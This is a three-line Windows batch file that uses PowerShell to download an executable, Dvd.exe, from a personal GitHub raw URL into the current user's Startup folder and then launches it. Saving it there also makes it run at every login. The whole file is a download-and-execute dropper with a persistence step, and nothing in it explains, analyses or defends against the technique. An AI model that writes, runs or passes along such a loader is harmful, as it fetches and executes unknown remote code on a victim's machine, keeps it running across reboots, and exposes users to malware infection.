@echo off
PowerShell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/erturuk12343/hi/main/Dvd.exe' -OutFile \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Dvd.exe\""
start "Dvd.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Dvd.exe"
